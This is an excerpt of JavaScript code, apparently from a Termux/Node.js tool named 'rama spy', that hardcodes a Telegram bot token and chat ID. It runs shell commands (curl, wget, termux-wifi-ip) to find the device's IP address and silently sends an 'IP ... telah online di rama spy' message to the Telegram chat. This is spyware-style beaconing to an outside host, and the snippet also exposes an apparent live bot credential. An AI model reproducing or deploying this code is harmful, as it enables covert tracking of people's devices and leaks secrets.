...
const BOT_TOKEN = '7281589846:AAEWcl4biIDKTwcCzJTw1TLQkN-v8uMsPQs';
const CHAT_ID = '6818799275';
    ...
    const getIP = () => {
      exec('curl -s ifconfig.me', (err, stdout1) => {
        ...
        if (ip && ip.match(/^\d{1,3}(\.\d{1,3}){3}$/)) {
          sendMessage(`IP ${ip} telah online di rama spy pada ${now}`);
        } else {
          exec('wget -qO- ifconfig.me', (err, stdout2) => {
            ...
            if (ip && ip.match(/^\d{1,3}(\.\d{1,3}){3}$/)) {
              ...
              exec('termux-wifi-ip', (err, stdout3) => {
                ip = stdout3.trim();
                sendMessage(`(Fallback) IP ${ip || 'tidak diketahui'} telah online di rama spy pada ${now}`);
              });
            }
          });
        }
